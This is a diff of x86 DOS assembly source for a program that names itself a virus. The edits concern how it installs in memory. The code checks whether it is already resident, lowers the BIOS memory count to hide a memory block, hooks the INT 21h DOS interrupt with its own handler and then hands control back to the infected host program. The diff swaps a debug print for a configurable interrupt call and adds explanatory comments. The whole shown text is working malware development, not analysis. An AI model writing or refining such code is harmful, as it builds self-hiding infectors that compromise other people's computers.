@@ -28,13 +28,7 @@ INSTALL_VIRUS:
 GetRelocation bp
 ;VIRUS RESIDENCY CHECK 
 mov ax, nVirusID
-int 21h
-
-SaveRegisters
- mov dl,'A' ; print 'A'
-   mov ah,2h
-   int 21h
-RestoreRegisters
+int nISRNumber
    
 cmp bx, nVirusID ;virus are installed ?
 je VIRUS_ALREADY_INSTALLED
@@ -107,15 +101,17 @@ pop ds ;make DS = segment of newly allocated block
 mov ax, 40h
 mov es, ax ;get BIOS segment
 sub word ptr [es:[13h]], (offset END_OF_CODE-offset START+1023)/1024
-;reduce available memory    
+;reduce available memory -->  -100h  
 ; INSTALL NEW ISR FOR INT 21h 
 mov al, nISRNumber
 lea si, dwOldExecISR-100h
 lea dx, NewDosISR-100h
-call HookISR
+call HookISR    
 ;  UPDATE CALL INSTRUCTION IN NewExecISR 
-mov ds:[dwOldExecISRVariable-100h],si ;update CALL FAR CS:[xxxx] instruction
-;in PROC NewDOSISR
+mov ds:[dwOldExecISRVariable-100h],si ;update CALL FAR CS:[xxxx] instruction in PROC NewDOSISR in the new mcb that ALLOCATE
+;When executing a far call in realaddress or virtual-8086 mode,
+; the processor pushes the current value of both the CS and EIP registers onto the stack for use as a return-instruction pointer.
+; The processor then performs a far branch to the code segment and offset specified with the target operand for the called procedure.
 CANNOT_INSTALL:
 VIRUS_ALREADY_INSTALLED:
 ;TRANSFER CONTROL TO HOST PROGRAM 
@@ -130,8 +126,6 @@ rep movsb
 mov bx, 100h
 push bx
 ret ;transfer to host program
-
-
 END_OF_CODE:
 CODE_SEG ENDS
 end start
